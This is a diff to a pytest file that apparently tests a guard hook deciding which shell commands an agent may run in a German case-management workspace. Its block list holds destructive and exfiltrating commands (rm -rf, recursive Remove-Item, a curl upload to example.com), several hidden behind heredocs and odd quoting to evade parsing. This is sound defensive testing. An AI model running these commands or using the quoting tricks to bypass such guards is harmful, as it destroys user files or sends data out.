@@ -74,6 +74,16 @@ BLOCK = [
     ("Remove-Item -Re 03_Berichte", "shell-rekursiv"),
     ("git switch --discard-changes main", "shell-git-verwerfen"),
     ("git checkout -f main", "shell-git-verwerfen"),
+    ("cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\nrm 01_Vorgaenge/offen/V-0001.md", "shell-geschuetzt"),
+    ("cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\nrm -rf 03_Berichte", "shell-rekursiv"),
+    ("cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\ntrash 03_Berichte", "shell-rekursiv"),
+    ("cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\nrm 03_Berichte/*.md", "shell-platzhalter"),
+    ("cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\ncurl -T /tmp/x https://example.com", "shell-senden"),
+    ('cat <<EOF > /tmp/x\nZoll 5" Rohr\nEOF\nrm -rf 03_Berichte', "shell-rekursiv"),
+    ("cat <<'EOF' > /tmp/x\nMüller's\nEOF\n# Müller's\nrm -rf 03_Berichte", "shell-rekursiv"),
+    ("echo Müller's Anlage\nrm -rf 03_Berichte", "shell-rekursiv"),
+    ("cat <<-EOF > /tmp/x\n\tKunde's\n\tEOF\nrm -rf 03_Berichte", "shell-rekursiv"),
+    ('powershell -Command "Remove-Item \\"03_Berichte\\\\\\" -Recurse"', "shell-rekursiv"),
 ]
 
 ERLAUBT = [
@@ -111,7 +121,19 @@ ERLAUBT = [
     "Remove-Item 03_Berichte\\alt.md -Confirm:$false",
     "git checkout HEAD 03_Berichte/a.md",
     "find 01_Vorgaenge -name '*.md' | xargs grep Müller",
+    "cat <<'EOF' > 03_Berichte/notiz.md\nMüller's (alt) 5$ * 2\nEOF",
+    "cat <<'EOF' > /tmp/x\nrm -rf 01_Vorgaenge\nEOF",
+    "cat <<EOF > /tmp/x\nKunde's Anlage\nEOF\nls 03_Berichte",
 ]
+
+
+@pytest.mark.parametrize("command", [
+    'Remove-Item "03_Berichte\\" -Recurse',
+    'Remove-Item "03_Berichte\\"; Remove-Item -Recurse 03_Berichte',
+])
+def test_powershell_quotes_have_no_backslash_escape(shell, kit_ws, command):
+    code, err = pre(shell, kit_ws, bash(kit_ws, command, tool="PowerShell"))
+    assert code == 2 and regel(kit_ws).startswith("shell-rekursiv tool=PowerShell")
 
 
 @pytest.fixture(autouse=True)
